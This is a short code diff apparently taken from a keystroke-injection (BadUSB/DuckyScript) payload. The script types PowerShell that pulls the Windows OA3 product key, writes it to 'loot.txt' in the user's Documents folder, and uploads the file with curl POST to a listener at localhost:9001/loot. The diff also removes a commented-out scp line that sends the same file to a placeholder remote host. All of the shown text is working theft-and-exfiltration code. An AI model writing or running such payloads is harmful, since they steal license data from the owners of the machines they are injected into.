@@ -10,7 +10,6 @@ ENTER
 DELAY 500
 STRING (Get-WmiObject -Query 'select * from SoftwareLicensingService').OA3xOriginalProductKey | Out-File -FilePath "$env:USERPROFILE\Documents\loot.txt"
 ENTER
-REM STRING scp "$env:USERPROFILE\Documents\loot.txt" username@remotehost:/path/to/remote/directory/
 STRING & "C:\Windows\System32\curl.exe" -X POST -F "file=@$($env:USERPROFILE)\Documents\loot.txt" http://localhost:9001/loot
 ENTER
 STRING exit
